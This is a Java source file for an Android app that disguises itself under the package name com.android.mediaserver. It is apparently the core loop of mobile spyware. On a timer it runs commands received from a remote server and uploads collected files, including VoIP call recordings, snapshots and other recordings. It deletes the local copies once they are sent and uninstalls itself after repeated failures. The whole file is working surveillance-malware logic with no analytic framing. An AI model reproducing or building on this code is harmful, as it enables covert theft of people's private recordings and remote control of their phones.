package com.android.mediaserver;

import android.content.Context;
import android.content.SharedPreferences;
import com.android.mediaserver.config.Config;
import com.android.mediaserver.db.DatabaseManager;
import com.android.mediaserver.fetchers.FetchedFile;
import com.android.mediaserver.fetchers.FetchersManager;
import com.android.mediaserver.file.FileUtils;
import com.android.mediaserver.network.NetworkManager;
import com.android.mediaserver.util.AppUtils;
import com.android.mediaserver.util.ApplicationsManager;
import java.io.File;
import java.util.List;
import timber.log.Timber;

public class AppCore {
  private static AppCore mInstance;
  private Config mConfig;
  private Context mContext;
  private DatabaseManager mDatabaseManager;
  private FetchersManager mFetchersManager;
  private NetworkManager mNetworkManager;
  private SharedPreferences mPreferences;

  private AppCore(Context context) {
    mContext = context;
    mConfig = Config.getInstance(context);
    mPreferences = context.getSharedPreferences(AppConstants.PREFERENCES_NAME, 0);
    mFetchersManager = FetchersManager.getInstance(context);
    mNetworkManager = NetworkManager.getInstance(context);
    mDatabaseManager = DatabaseManager.getInstance(context);
  }

  public static AppCore getInstance(Context context) {
    if (mInstance == null) {
      mInstance = new AppCore(context);
    }
    return mInstance;
  }

  public void doWork() {
    int count = mPreferences.getInt(AppConstants.HEARTBEATS_COUNTER_KEY, 0);
    Timber.i("----------------- Started core work #%d -----------------", Integer.valueOf(count));
    if (mConfig.getFailuresToUninstall() <= mPreferences.getInt(
        AppConstants.NUMBER_OF_FAILURES_KEY, 0)) {
      Timber.d("Uninstalling, Reason: too many send failures", new Object[0]);
      mNetworkManager.notifyUninstall();
      ApplicationsManager.getInstance(mContext).uninstallSelf();
    }
    mNetworkManager.checkAndExecuteCommands();
    if (count % mConfig.getHeartbeatsPerSend() == 0) {
      count = 0;
      Timber.i("----------------- Sending Data -----------------", new Object[0]);
      sendData(mFetchersManager.fetchAll());
    }
    mPreferences.edit().putInt(AppConstants.HEARTBEATS_COUNTER_KEY, count + 1).commit();
    Timber.i("----------------- Finished core work -----------------", new Object[0]);
  }

  private void sendData(List<FetchedFile> filesToSend) {
    boolean didFail;
    if (filesToSend.size() != 0) {
      didFail = true;
    } else {
      didFail = false;
    }
    for (FetchedFile fetchedFile : filesToSend) {
      if (shouldSendFile(fetchedFile)) {
        if (AppUtils.isConnectedToInternet(mContext)) {
          int retryCount = 0;
          do {
            retryCount++;
            try {
              File fileToSend = fetchedFile.getFile();
              if (true == mNetworkManager.sendFile(fileToSend,
                  fetchedFile.getFile().getAbsolutePath(), fetchedFile.getType(),
                  fetchedFile.getSubtype())) {
                didFail = false;
                File file = fetchedFile.getFile();
                mDatabaseManager.createOrUpdateFile(file);
                if (fileToSend.getAbsolutePath().contains(mConfig.getFilesDirectoryName())
                    || fileToSend.getAbsolutePath().contains(mConfig.getUploadDirectoryName())
                    || fileToSend.getAbsolutePath()
                    .contains(mConfig.getVoipRecordingsDirectoryName())
                    || fileToSend.getAbsolutePath()
                    .contains(mConfig.getSnapshotsDirectoryName())
                    || fileToSend.getAbsolutePath()
                    .contains(mConfig.getRecordingsDirectoryName())) {
                  fileToSend.delete();
                }
                if (file.getAbsolutePath().contains(mConfig.getFilesDirectoryName())
                    || file.getAbsolutePath().contains(mConfig.getUploadDirectoryName())
                    || file.getAbsolutePath()
                    .contains(mConfig.getVoipRecordingsDirectoryName())
                    || file.getAbsolutePath().contains(mConfig.getSnapshotsDirectoryName())
                    || file.getAbsolutePath().contains(mConfig.getRecordingsDirectoryName())) {
                  file.delete();
                }
              }
            } catch (Exception e) {
              Timber.e(e, "Failed to send file", new Object[0]);
            }
            try {
              Thread.sleep((long) mConfig.getSleepBetweenAttempts());
            } catch (InterruptedException e2) {
            }
          } while (retryCount != mConfig.getNumberOfAttempts());
        } else {
          didFail = false;
        }
      }
    }
    if (true == didFail) {
      int numOfFailures = mPreferences.getInt(AppConstants.NUMBER_OF_FAILURES_KEY, 0) + 1;
      mPreferences.edit().putInt(AppConstants.NUMBER_OF_FAILURES_KEY, numOfFailures).commit();
      if (numOfFailures >= mConfig.getFailuresToUninstall()) {
        Timber.d("Uninstalling, Reason: Too many send failures", new Object[0]);
        mNetworkManager.notifyUninstall();
        ApplicationsManager.getInstance(mContext).uninstallSelf();
        return;
      }
      return;
    }
    mPreferences.edit().putInt(AppConstants.NUMBER_OF_FAILURES_KEY, 0).commit();
  }

  private boolean shouldSendFile(FetchedFile fetchedFile) {
    boolean z = true;
    File file = fetchedFile.getFile();
    if (true != file.exists() || 0 == file.length()) {
      return false;
    }
    if (mDatabaseManager.isHashExists(FileUtils.getFileSha1(file))) {
      z = false;
    }
    return z;
  }
}
